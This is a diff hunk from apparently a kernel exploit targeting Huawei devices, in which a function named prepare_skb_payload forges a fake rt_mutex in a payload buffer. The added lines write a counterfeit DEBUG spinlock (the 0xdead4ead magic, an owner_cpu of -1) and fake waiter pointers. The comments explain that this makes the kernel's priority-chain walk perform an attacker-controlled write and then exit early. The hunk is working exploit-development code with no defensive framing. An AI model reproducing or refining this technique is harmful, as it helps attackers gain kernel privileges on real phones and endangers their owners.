@@ -593,10 +593,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
          on the overlaid W->task); owner = NULL makes rt_mutex_adjust_
          prio_chain return right after rt_mutex_dequeue performed the
          write.  See main.c overlay comment. */
-      /* HUAWEI rt_mutex layout (replica disasm): waiters.rb_root@0x18,
-         rb_leftmost@0x20, owner@0x28 (+8/+0x10 = kshield bookkeeping the
-         kernel writes itself). owner=0 -> walk exits right after the [7]
-         erase (our write) at the !owner check. */
+      /* HUAWEI rt_mutex layout (replica DWARF+disasm, emulator-validated):
+         wait_lock@0 = DEBUG raw_spinlock {arch@0=0, magic@4=0xdead4ead,
+         owner_cpu@8=-1, owner@0x10=0(≠current)}, waiters.rb_root@0x18,
+         rb_leftmost@0x20, owner@0x28=0. Without the DEBUG magic every
+         trylock on this lock failed - all prior walks never ran. */
+      put64(p, LOCK_OFF + 0x00, 0xdead4ead00000000ULL);
+      put64(p, LOCK_OFF + 0x08, 0x00000000ffffffffULL);
+      put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, fake_w0);
       put64(p, LOCK_OFF + 0x20, fake_w0);
       put64(p, LOCK_OFF + 0x28, 0);
